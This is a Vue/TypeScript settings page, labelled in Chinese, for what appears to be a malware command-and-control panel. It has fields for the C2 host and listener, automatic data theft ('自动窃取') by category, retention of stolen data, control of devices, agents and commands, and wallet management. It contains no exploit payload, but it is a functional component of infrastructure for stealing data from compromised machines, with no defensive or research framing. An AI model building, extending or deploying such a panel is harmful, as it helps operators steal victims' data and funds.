<template>
  <div class="page-container">
    <el-card shadow="never">
      <div class="settings-header">
        <span class="settings-title">系统设置</span>
        <el-button type="primary" :loading="saving" @click="saveSettings">
          <el-icon><Check /></el-icon> 保存设置
        </el-button>
      </div>

      <el-tabs v-model="activeTab" tab-position="left" style="min-height: 500px">
        <!-- Basic -->
        <el-tab-pane label="基本设置" name="basic">
          <el-form label-width="160px" class="settings-form">
            <el-form-item label="CORS域名">
              <el-input v-model="settings.basic.cors_origins" type="textarea" :rows="3" placeholder="逗号分隔" />
            </el-form-item>
            <el-form-item label="匿名限速">
              <el-input-number v-model="settings.basic.rate_anon" :min="0" />
            </el-form-item>
            <el-form-item label="认证限速">
              <el-input-number v-model="settings.basic.rate_auth" :min="0" />
            </el-form-item>
            <el-form-item label="登录限速">
              <el-input-number v-model="settings.basic.rate_login" :min="0" />
            </el-form-item>
            <el-form-item label="默认重定向">
              <el-input v-model="settings.basic.default_redirect" placeholder="URL" />
            </el-form-item>
            <el-form-item label="Token过期(秒)">
              <el-input-number v-model="settings.basic.token_expire" :min="0" />
            </el-form-item>
          </el-form>
        </el-tab-pane>

        <!-- C2 -->
        <el-tab-pane label="C2设置" name="c2">
          <el-form label-width="160px" class="settings-form">
            <el-form-item label="C2主机">
              <el-input v-model="settings.c2.c2_host" placeholder="C2 Host" />
            </el-form-item>
            <el-form-item label="监听主机">
              <el-input v-model="settings.c2.listen_host" placeholder="Listen Host" />
            </el-form-item>
            <el-form-item label="监听端口">
              <el-input-number v-model="settings.c2.listen_port" :min="1" :max="65535" />
            </el-form-item>
            <el-form-item label="重定向URL">
              <el-input v-model="settings.c2.redirect_url" placeholder="Redirect URL" />
            </el-form-item>
          </el-form>
        </el-tab-pane>

        <!-- Exploit -->
        <el-tab-pane label="利用设置" name="exploit">
          <el-form label-width="160px" class="settings-form">
            <el-form-item label="自动窃取">
              <el-switch v-model="settings.exploit.auto_exfil" />
            </el-form-item>
            <el-form-item label="窃取分类">
              <el-input v-model="settings.exploit.exfil_categories" type="textarea" :rows="3" placeholder="逗号分隔" />
            </el-form-item>
            <el-form-item label="轮询间隔(秒)">
              <el-input-number v-model="settings.exploit.poll_interval" :min="1" />
            </el-form-item>
          </el-form>
        </el-tab-pane>

        <!-- Retention -->
        <el-tab-pane label="保留策略" name="retention">
          <el-form label-width="200px" class="settings-form">
            <el-form-item label="日志保留天数">
              <el-input-number v-model="settings.retention.log_days" :min="0" />
            </el-form-item>
            <el-form-item label="审计保留天数">
              <el-input-number v-model="settings.retention.audit_days" :min="0" />
            </el-form-item>
            <el-form-item label="窃取数据保留天数">
              <el-input-number v-model="settings.retention.exfil_days" :min="0" />
            </el-form-item>
            <el-form-item label="文件日志保留天数">
              <el-input-number v-model="settings.retention.fs_log_days" :min="0" />
            </el-form-item>
            <el-form-item label="归档批次行数">
              <el-input-number v-model="settings.retention.archive_batch_rows" :min="1" />
            </el-form-item>
            <el-form-item label="删除批次行数">
              <el-input-number v-model="settings.retention.delete_chunk_rows" :min="1" />
            </el-form-item>
            <el-form-item label="窃取删除批次行数">
              <el-input-number v-model="settings.retention.exfil_delete_chunk_rows" :min="1" />
            </el-form-item>
            <el-form-item label="备份保留天数">
              <el-input-number v-model="settings.retention.backup_keep_days" :min="0" />
            </el-form-item>
          </el-form>
        </el-tab-pane>

        <!-- Cron -->
        <el-tab-pane label="定时任务" name="cron">
          <el-form label-width="200px" class="settings-form">
            <el-form-item label="轮换开始时间">
              <el-input v-model="settings.cron.rotate_start_hhmm" placeholder="HH:MM" />
            </el-form-item>
            <el-form-item label="轮换窗口(分钟)">
              <el-input-number v-model="settings.cron.rotate_window_minutes" :min="1" />
            </el-form-item>
            <el-form-item label="轮换间隔(秒)">
              <el-input-number v-model="settings.cron.rotate_tick_seconds" :min="1" />
            </el-form-item>
            <el-form-item label="命令超时(分钟)">
              <el-input-number v-model="settings.cron.cmd_timeout_minutes" :min="1" />
            </el-form-item>
            <el-form-item label="命令超时检查间隔(秒)">
              <el-input-number v-model="settings.cron.cmd_timeout_tick_seconds" :min="1" />
            </el-form-item>
          </el-form>
        </el-tab-pane>

        <!-- Auth -->
        <el-tab-pane label="认证调优" name="auth">
          <el-form label-width="200px" class="settings-form">
            <el-form-item label="OTP待定TTL(秒)">
              <el-input-number v-model="settings.auth.otp_pending_ttl_sec" :min="1" />
            </el-form-item>
            <el-form-item label="Setup Token TTL(秒)">
              <el-input-number v-model="settings.auth.setup_token_ttl_sec" :min="1" />
            </el-form-item>
            <el-form-item label="渠道时间偏差(秒)">
              <el-input-number v-model="settings.auth.channel_ts_skew_sec" :min="0" />
            </el-form-item>
            <el-form-item label="活跃设备(分钟)">
              <el-input-number v-model="settings.auth.active_device_minutes" :min="1" />
            </el-form-item>
            <el-form-item label="仪表盘最大天数">
              <el-input-number v-model="settings.auth.dashboard_max_days" :min="1" />
            </el-form-item>
          </el-form>
        </el-tab-pane>

        <!-- Limits -->
        <el-tab-pane label="速率限制" name="limits">
          <el-form label-width="220px" class="settings-form">
            <el-form-item label="登录/分钟">
              <el-input-number v-model="settings.limits.auth_login_per_min" :min="0" />
            </el-form-item>
            <el-form-item label="2FA验证/分钟">
              <el-input-number v-model="settings.limits.auth_2fa_per_min" :min="0" />
            </el-form-item>
            <el-form-item label="发送OTP/分钟">
              <el-input-number v-model="settings.limits.auth_send_otp_per_min" :min="0" />
            </el-form-item>
            <el-form-item label="发送命令/分钟">
              <el-input-number v-model="settings.limits.cmd_send_per_min" :min="0" />
            </el-form-item>
            <el-form-item label="批量命令/分钟">
              <el-input-number v-model="settings.limits.cmd_bulk_per_min" :min="0" />
            </el-form-item>
            <el-form-item label="2FA设置/分钟">
              <el-input-number v-model="settings.limits.tfa_setup_per_min" :min="0" />
            </el-form-item>
            <el-form-item label="2FA验证测试/分钟">
              <el-input-number v-model="settings.limits.tfa_verify_test_per_min" :min="0" />
            </el-form-item>
          </el-form>
        </el-tab-pane>

        <!-- Frontend -->
        <el-tab-pane label="前端路由" name="frontend">
          <el-form label-width="160px" class="settings-form">
            <el-form-item label="登录路由">
              <el-input v-model="settings.frontend.route_login" placeholder="/login" />
            </el-form-item>
            <el-form-item label="仪表盘路由">
              <el-input v-model="settings.frontend.route_dashboard" placeholder="/dashboard" />
            </el-form-item>
          </el-form>
        </el-tab-pane>

        <!-- Device -->
        <el-tab-pane label="设备设置" name="device">
          <el-form label-width="200px" class="settings-form">
            <el-form-item label="Cookie有效期(秒)">
              <el-input-number v-model="settings.device.cookie_max_age_sec" :min="1" />
            </el-form-item>
            <el-form-item label="日志尾部行数">
              <el-input-number v-model="settings.device.log_tail_lines" :min="1" />
            </el-form-item>
            <el-form-item label="路径最大清理长度">
              <el-input-number v-model="settings.device.sanitize_path_max" :min="1" />
            </el-form-item>
            <el-form-item label="窃取描述最大长度">
              <el-input-number v-model="settings.device.exfil_desc_max" :min="1" />
            </el-form-item>
            <el-form-item label="默认分页大小">
              <el-input-number v-model="settings.device.page_default_limit" :min="1" />
            </el-form-item>
            <el-form-item label="最大分页大小">
              <el-input-number v-model="settings.device.page_max_limit" :min="1" />
            </el-form-item>
          </el-form>
        </el-tab-pane>

        <!-- Security -->
        <el-tab-pane label="安全设置" name="security">
          <el-form label-width="220px" class="settings-form">
            <el-form-item label="要求2FA">
              <el-switch v-model="settings.security.require_2fa" />
            </el-form-item>
            <el-form-item label="会话超时(分钟)">
              <el-input-number v-model="settings.security.session_timeout_minutes" :min="1" />
            </el-form-item>
            <el-form-item label="强制用户2FA">
              <el-switch v-model="settings.security.force_2fa_users" />
            </el-form-item>
            <el-form-item label="强制代理2FA">
              <el-switch v-model="settings.security.force_2fa_agents" />
            </el-form-item>
            <el-form-item label="2FA锁定尝试次数">
              <el-input-number v-model="settings.security.twofa_lock_after_attempts" :min="1" />
            </el-form-item>
            <el-form-item label="2FA锁定时间(分钟)">
              <el-input-number v-model="settings.security.twofa_lock_minutes" :min="1" />
            </el-form-item>
            <el-divider>模块2FA开关</el-divider>
            <el-form-item v-for="mod in twofaModules" :key="mod.key" :label="mod.label">
              <el-switch v-model="(settings.security as any)[mod.key]" />
            </el-form-item>
          </el-form>
        </el-tab-pane>

        <!-- Watermark -->
        <el-tab-pane label="水印设置" name="watermark">
          <el-form label-width="160px" class="settings-form">
            <el-form-item label="启用水印">
              <el-switch v-model="settings.watermark.enabled" />
            </el-form-item>
            <el-form-item label="水印文字">
              <el-input v-model="settings.watermark.text" placeholder="水印内容" />
            </el-form-item>
            <el-form-item label="颜色">
              <el-color-picker v-model="settings.watermark.color" />
            </el-form-item>
            <el-form-item label="字号">
              <el-input-number v-model="settings.watermark.font_size" :min="1" />
            </el-form-item>
            <el-form-item label="透明度">
              <el-input-number v-model="settings.watermark.opacity" :min="0" :max="1" :step="0.1" />
            </el-form-item>
            <el-form-item label="旋转角度">
              <el-input-number v-model="settings.watermark.rotation" :min="0" :max="360" />
            </el-form-item>
          </el-form>
        </el-tab-pane>
      </el-tabs>
    </el-card>
  </div>
</template>

<script setup lang="ts">
import { ref, reactive, onMounted, inject } from 'vue'
import { settingsApi } from '@/api/modules'
import { ElMessage } from 'element-plus'

const withOtpRetry = inject('withOtpRetry') as <T>(fn: (otp?: string) => Promise<T>) => Promise<T>

const activeTab = ref('basic')
const loading = ref(false)
const saving = ref(false)

const twofaModules = [
  { key: 'twofa_users', label: '用户管理' },
  { key: 'twofa_templates', label: '模板管理' },
  { key: 'twofa_channels', label: '渠道管理' },
  { key: 'twofa_devices', label: '设备管理' },
  { key: 'twofa_commands', label: '命令管理' },
  { key: 'twofa_profile', label: '个人资料' },
  { key: 'twofa_agents', label: '代理管理' },
  { key: 'twofa_exfil', label: '数据窃取' },
  { key: 'twofa_audit', label: '审计日志' },
  { key: 'twofa_logs', label: '系统日志' },
  { key: 'twofa_notifications', label: '通知' },
  { key: 'twofa_wallets', label: '钱包管理' },
]

const settings = reactive({
  basic: {
    cors_origins: '',
    rate_anon: 0,
    rate_auth: 0,
    rate_login: 0,
    default_redirect: '',
    token_expire: 0,
    watermark_enabled: false,
    watermark_color: '',
    watermark_opacity: 0,
  },
  c2: {
    c2_host: '',
    listen_host: '',
    listen_port: 7000,
    redirect_url: '',
  },
  exploit: {
    auto_exfil: false,
    exfil_categories: '',
    poll_interval: 30,
  },
  retention: {
    log_days: 30,
    audit_days: 90,
    exfil_days: 30,
    fs_log_days: 30,
    archive_batch_rows: 1000,
    delete_chunk_rows: 500,
    exfil_delete_chunk_rows: 500,
    backup_keep_days: 30,
  },
  cron: {
    rotate_start_hhmm: '00:00',
    rotate_window_minutes: 60,
    rotate_tick_seconds: 60,
    cmd_timeout_minutes: 30,
    cmd_timeout_tick_seconds: 60,
  },
  auth: {
    otp_pending_ttl_sec: 300,
    setup_token_ttl_sec: 600,
    channel_ts_skew_sec: 300,
    active_device_minutes: 10,
    dashboard_max_days: 30,
  },
  limits: {
    auth_login_per_min: 10,
    auth_2fa_per_min: 10,
    auth_send_otp_per_min: 5,
    cmd_send_per_min: 30,
    cmd_bulk_per_min: 10,
    tfa_setup_per_min: 5,
    tfa_verify_test_per_min: 10,
  },
  frontend: {
    route_login: '/login',
    route_dashboard: '/dashboard',
  },
  device: {
    cookie_max_age_sec: 86400,
    log_tail_lines: 200,
    sanitize_path_max: 256,
    exfil_desc_max: 256,
    page_default_limit: 20,
    page_max_limit: 100,
  },
  security: {
    require_2fa: false,
    session_timeout_minutes: 60,
    force_2fa_users: false,
    force_2fa_agents: false,
    twofa_lock_after_attempts: 5,
    twofa_lock_minutes: 15,
    twofa_users: false,
    twofa_templates: false,
    twofa_channels: false,
    twofa_devices: false,
    twofa_commands: false,
    twofa_profile: false,
    twofa_agents: false,
    twofa_exfil: false,
    twofa_audit: false,
    twofa_logs: false,
    twofa_notifications: false,
    twofa_wallets: false,
  },
  watermark: {
    enabled: false,
    text: '',
    color: '#000000',
    font_size: 14,
    opacity: 0.1,
    rotation: 0,
  },
})

async function loadSettings() {
  loading.value = true
  try {
    const res: any = await settingsApi.all()
    if (res) {
      // Merge each section
      const s = settings as any
      for (const key of Object.keys(s)) {
        if (res[key] && typeof res[key] === 'object') {
          const section = res[key]
          for (const field of Object.keys(section)) {
            if (field in s[key]) {
              if (field === 'cors_origins' || field === 'exfil_categories') {
                const val = section[field]
                s[key][field] = Array.isArray(val) ? val.join(', ') : (val || '')
              } else {
                s[key][field] = section[field]
              }
            }
          }
        }
      }
    }
  } catch {
    // Try /api/settings as fallback
    try {
      const res: any = await settingsApi.get()
      if (res) {
        const s = settings as any
        for (const key of Object.keys(s)) {
          if (res[key] && typeof res[key] === 'object') {
            const section = res[key]
            for (const field of Object.keys(section)) {
              if (field in s[key]) {
                if (field === 'cors_origins' || field === 'exfil_categories') {
                  const val = section[field]
                  s[key][field] = Array.isArray(val) ? val.join(', ') : (val || '')
                } else {
                  s[key][field] = section[field]
                }
              }
            }
          }
        }
      }
    } catch {
      // ignore
    }
  } finally {
    loading.value = false
  }
}

async function saveSettings() {
  saving.value = true
  try {
    // Prepare data - convert comma-separated strings back to arrays
    const data: Record<string, any> = {}
    const s = settings as any
    for (const key of Object.keys(s)) {
      data[key] = { ...s[key] }
      if (data[key].cors_origins && typeof data[key].cors_origins === 'string') {
        data[key].cors_origins = data[key].cors_origins.split(',').map((s: string) => s.trim()).filter(Boolean)
      }
      if (data[key].exfil_categories && typeof data[key].exfil_categories === 'string') {
        data[key].exfil_categories = data[key].exfil_categories.split(',').map((s: string) => s.trim()).filter(Boolean)
      }
    }
    await withOtpRetry((otp) => settingsApi.update(data, otp))
    ElMessage.success('设置已保存')
  } catch {
    // handled
  } finally {
    saving.value = false
  }
}

onMounted(() => {
  loadSettings()
})
</script>

<style scoped>
.settings-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
}
.settings-title {
  font-size: 18px;
  font-weight: 600;
}
.settings-form {
  max-width: 700px;
  padding: 10px 0;
}
</style>
